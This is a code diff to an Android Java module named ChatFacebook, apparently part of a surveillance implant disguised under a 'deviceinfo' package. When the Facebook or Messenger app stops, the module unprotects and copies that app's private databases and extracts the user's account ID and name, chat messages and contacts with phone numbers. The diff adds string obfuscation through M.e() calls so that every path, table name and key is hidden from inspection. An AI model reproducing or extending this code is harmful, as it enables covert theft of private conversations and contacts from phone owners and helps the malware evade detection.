@@ -24,6 +24,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatFacebook extends SubModuleChat {
 
@@ -43,8 +44,8 @@ public class ChatFacebook extends SubModuleChat {
 
 	private String account_name;
 
-	String dirKatana = "/data/data/com.facebook.katana/databases";
-	String dirOrca = "/data/data/com.facebook.orca/databases";
+	String dirKatana = M.e("/data/data/com.facebook.katana/databases");
+	String dirOrca = M.e("/data/data/com.facebook.orca/databases");
 
 	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
 
@@ -60,9 +61,9 @@ public class ChatFacebook extends SubModuleChat {
 
 	@Override
 	void notifyStopProgram(String processName) {
-		if (processName.contains("katana"))
+		if (processName.contains(M.e("katana")))
 			fetchFb(dirKatana);
-		else if (processName.contains("orca"))
+		else if (processName.contains(M.e("orca")))
 			fetchFb(dirOrca);
 	}
 
@@ -100,7 +101,7 @@ public class ChatFacebook extends SubModuleChat {
 
 	private boolean readMyAccount(String dbDir) {
 
-		String dbFile = "prefs_db";
+		String dbFile = M.e("prefs_db");
 
 		if (!Path.unprotect(dbDir + "/" + dbFile, 3, false)) {
 
@@ -127,11 +128,11 @@ public class ChatFacebook extends SubModuleChat {
 
 		Hashtable<String, String> preferences = visitor.getMap();
 
-		account_uid = preferences.get("/auth/user_data/fb_uid");
-		account_name = preferences.get("/auth/user_data/fb_username");
+		account_uid = preferences.get(M.e("/auth/user_data/fb_uid"));
+		account_name = preferences.get(M.e("/auth/user_data/fb_username"));
 
 		if (StringUtils.isEmpty(account_name)) {
-			String account_user = preferences.get("/auth/user_data/fb_me_user");
+			String account_user = preferences.get(M.e("/auth/user_data/fb_me_user"));
 			try {
 				JSONObject root = (JSONObject) new JSONTokener(account_user).nextValue();
 
@@ -177,8 +178,8 @@ public class ChatFacebook extends SubModuleChat {
 				}
 			}
 
-			String dbFile1 = "threads_db";
-			String dbFile2 = "threads_db2";
+			String dbFile1 = M.e("threads_db");
+			String dbFile2 = M.e("threads_db2");
 
 			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
 			if (helper == null) {
@@ -219,7 +220,8 @@ public class ChatFacebook extends SubModuleChat {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 		String[] projection = new String[] { "text", "sender", "timestamp_ms" };
-		String selection = "thread_id = '" + conv.id + "' and text != '' and timestamp_ms > " + lastConvId;
+		String selection = String.format(M.e("thread_id = %s and text != '' and timestamp_ms > %s"), conv.id,
+				lastConvId);
 		String order = "timestamp_ms";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
@@ -357,7 +359,7 @@ public class ChatFacebook extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readAddressUser) ");
 		}
-		String dbFile = "users_db2";
+		String dbFile = M.e("users_db2");
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		// SQLiteDatabase db = helper.getReadableDatabase();
 
@@ -374,12 +376,12 @@ public class ChatFacebook extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readAddressContacts) ");
 		}
-		String dbFile = "contacts_db2";
+		String dbFile = M.e("contacts_db2");
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		// SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordListVisitor visitor = new RecordListVisitor("data");
-		helper.traverseRecords("contacts", visitor);
+		helper.traverseRecords(M.e("contacts"), visitor);
 		boolean serializeContacts = false;
 		for (String value : visitor.getList()) {
 			try {
@@ -399,14 +401,14 @@ public class ChatFacebook extends SubModuleChat {
 
 	private Contact json2Contact(String value) throws JSONException {
 		JSONObject root = (JSONObject) new JSONTokener(value).nextValue();
-		String fbId = root.getString("profileFbid");
-		JSONObject name = root.getJSONObject("name");
-		String fullName = name.getString("displayName");
+		String fbId = root.getString(M.e("profileFbid"));
+		JSONObject name = root.getJSONObject(M.e("name"));
+		String fullName = name.getString(M.e("displayName"));
 
-		JSONArray phones = root.getJSONArray("phones");
+		JSONArray phones = root.getJSONArray(M.e("phones"));
 		String numbers = "";
 		for (int i = 0; i < phones.length(); i++) {
-			numbers += phones.getJSONObject(i).get("universalNumber") + " ";
+			numbers += phones.getJSONObject(i).get(M.e("universalNumber")) + " ";
 		}
 		// String picture = root.getString("bigPictureUrl");
 		Contact contact = new Contact(fbId, numbers, fullName, "Id: " + fbId);
